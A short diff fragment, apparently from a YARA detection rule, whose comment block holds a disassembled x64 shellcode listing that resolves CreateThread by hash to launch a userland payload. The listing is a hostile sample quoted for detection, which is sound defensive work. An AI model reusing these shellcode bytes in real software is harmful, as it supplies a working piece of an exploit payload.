+            31C9                 | 1.                   | xor ecx, ecx
+            51                   | Q                    | push rcx
+            51                   | Q                    | push rcx
+            51                   | Q                    | push rcx
+            51                   | Q                    | push rcx
+            4159                 | AY                   | pop r9
+            4C8D051A000000       | L......              | lea r8, [rel userland_payload]
+            5A                   | Z                    | pop rdx
+            4883EC20             | H..                  | sub rsp, 0x20
+            41BB46451B22         | A.FE."               | mov r11d, createthread_hash
+            E868FFFFFF           | .h...                | call x64_block_api_direct
+            4889EC               | H..                  | mov rsp, rbp
+            5D                   | ]                    | pop rbp
+            415F                 | A_                   | pop r15
+            5E                   | ^                    | pop rsi
+            C3                   | .                    | ret
         */
     
         strings:
